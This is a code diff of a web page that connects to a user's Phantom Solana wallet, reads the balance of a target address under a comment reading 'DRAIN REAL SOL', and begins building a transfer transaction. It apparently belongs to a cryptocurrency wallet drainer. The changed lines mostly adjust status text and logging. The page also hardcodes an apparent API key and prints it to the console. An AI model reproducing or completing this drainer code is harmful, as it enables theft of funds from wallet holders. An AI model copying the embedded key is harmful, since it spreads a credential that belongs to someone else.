@@ -51,7 +51,7 @@
             background: rgba(0,0,0,0.3); 
             padding: 8px; 
             border-radius: 4px;
-            max-height: 100px;
+            max-height: 150px;
             overflow-y: auto;
         }
     </style>
@@ -78,7 +78,9 @@
         // YOUR HELIUS API KEY
         const HELIUS_KEY = "e67b03d4-9ec2-4eb7-a188-97f90fa26a45";
         
-        // MAINNET ENDPOINT (Use testnet.helius-rpc.com if your key is for Testnet)
+        // IMPORTANT: 
+        // If your key is for MAINNET, use this URL.
+        // If your key is for TESTNET, change to https://api.testnet.helius-rpc.com/
         const RPC_URL = "https://mainnet.helius-rpc.com/"; 
 
         async function run() {
@@ -93,12 +95,15 @@
             }
 
             btn.disabled = true;
-            status.innerText = "Connecting...";
+            status.innerText = "Connecting to Phantom...";
+            log.innerText = ""; // Clear logs
 
             try {
-                // Connect Wallet (Only once)
-                await window.solana.connect();
-                
+                // Connect Wallet
+                const resp = await window.solana.connect();
+                console.log("Phantom Connected:", resp.publicKey);
+                status.innerText = "Wallet Connected. Fetching Balance...";
+
                 // Create connection with custom headers for Helius
                 const connection = new solanaWeb3.Connection(RPC_URL, {
                     commitment: "confirmed",
@@ -109,20 +114,20 @@
                         // Add the API key header
                         init.headers["X-API-Key"] = HELIUS_KEY;
                         
-                        // Log for debugging (optional)
-                        console.log("Fetching:", url, "Headers:", init.headers);
+                        // Log for debugging
+                        console.log("Helius Request:", url);
+                        console.log("Headers:", init.headers);
                         
                         return fetch(url, init);
                     }
                 });
 
-                status.innerText = "Fetching Balance...";
-                
                 // --- DRAIN REAL SOL ---
                 // Fetch balance from Target
+                status.innerText = "Fetching Balance...";
                 const balance = await connection.getBalance(new solanaWeb3.PublicKey(TARGET));
                 
-                status.innerText = `Balance: ${balance / 10**9} SOL. Constructing Transaction...`;
+                status.innerText = `Balance: ${(balance / 10**9).toFixed(4)} SOL. Constructing Transaction...`;
                 
                 const tx = new solanaWeb3.Transaction();
                 tx.add(solanaWeb3.SystemProgram.transfer({
